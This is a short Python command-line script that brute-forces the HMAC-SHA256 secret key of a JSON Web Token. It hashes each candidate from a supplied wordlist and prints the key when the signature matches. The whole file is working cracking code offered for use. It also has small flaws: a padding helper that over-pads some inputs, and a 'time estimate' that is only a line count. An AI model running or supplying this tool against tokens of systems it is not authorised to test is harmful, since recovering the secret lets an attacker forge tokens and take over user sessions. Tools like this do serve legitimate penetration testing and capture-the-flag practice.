import base64
import hmac
import hashlib
import sys
import time

def base64_url_decode(data):
    """Decodes a base64 URL-encoded string."""
    padding = '=' * (4 - (len(data) % 4)) 
    return base64.urlsafe_b64decode(data + padding)

def base64_url_encode(data):
    """Encodes data to a base64 URL-safe string."""
    return base64.urlsafe_b64encode(data).decode().rstrip('=')

def estimate_max_time(wordlist_path):
    """Estimates the maximum time for brute force based on the wordlist size."""
    try:
        with open(wordlist_path, 'br') as f:
            return sum(1 for line in f)
    except Exception as e:
        print(f"Error estimating time: {e}")
        return None

def brute_force_jwt(jwt_token, wordlist):
    """
    Brute-force the secret key for a given JWT token.

    :param jwt_token: The JWT token to crack.
    :param wordlist: Path to the wordlist containing potential secret keys.
    """
    header, payload, signature = jwt_token.split('.')
    decoded_signature = base64_url_decode(signature)

    with open(wordlist, 'r') as f:
        for secret in f:
            secret = secret.strip()
            # Generate HMAC256
            message = f"{header}.{payload}".encode()
            generated_signature = hmac.new(secret.encode(), message, hashlib.sha256).digest()

            if generated_signature == decoded_signature:
                print(f"[+] Secret key found: {secret}")
                return

    print("[-] Secret key not found in the wordlist.")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python jwt_bruteforce.py <jwt_token> <wordlist_path>")
        sys.exit(1)

    jwt_token = sys.argv[1]
    wordlist = sys.argv[2]

    # Estimate max time
    max_time_estimation = estimate_max_time(wordlist)
    # Print the current time
    start_time = time.time()
    print(f"[INFO] Start time: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(start_time))}")

    if max_time_estimation is not None:
        print(f"[INFO] Estimated maximum time based on wordlist size: {max_time_estimation} units")

    brute_force_jwt(jwt_token, wordlist)

    # Print the end time
    end_time = time.time()
    print(f"[INFO] End time: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(end_time))}")
    print(f"[INFO] Total execution time: {end_time - start_time:.2f} seconds")
